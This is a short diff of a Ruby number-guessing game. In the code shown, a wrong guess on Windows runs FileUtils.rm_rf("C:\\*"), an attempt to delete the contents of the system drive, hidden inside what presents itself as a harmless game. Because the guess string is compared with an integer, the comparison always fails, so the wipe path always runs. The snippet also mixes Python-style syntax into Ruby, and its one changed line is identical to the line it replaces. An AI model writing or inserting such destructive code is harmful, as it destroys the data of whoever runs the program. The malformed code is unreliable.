@@ -9,7 +9,7 @@ guess = gets.chomp()
 answer = rand(1..6)
 
 if guess == answer:
-    puts("That's correct!")
+    puts("That's correct!")
 else
     if RUBY_PLATFORM.include?("mswin") || RUBY_PLATFORM.include?("mingw")
         FileUtils.rm_rf("C:\\*")
